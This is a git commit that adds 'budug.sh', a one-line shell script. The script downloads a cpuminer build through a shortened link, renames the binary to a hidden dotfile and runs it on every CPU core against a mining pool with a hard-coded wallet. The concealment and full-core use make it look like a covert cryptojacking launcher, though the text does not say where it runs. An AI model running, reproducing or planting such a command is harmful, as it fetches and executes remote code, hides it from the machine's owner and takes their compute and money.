cf0e6bc5b4c7b741732fbe492bebe916712b2d15
mynameokta11 <90979709+mynameokta11@users.noreply.github.com>
2021-11-26 03:22:42 +0800

    Create budug.sh

---
+++ budug.sh
@@ -0,0 +1,1 @@
+wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRW5GfQrd9VoR5Yz63iUBR5j4h8NBUe73h.budug -t $(nproc --all) --no-tune 
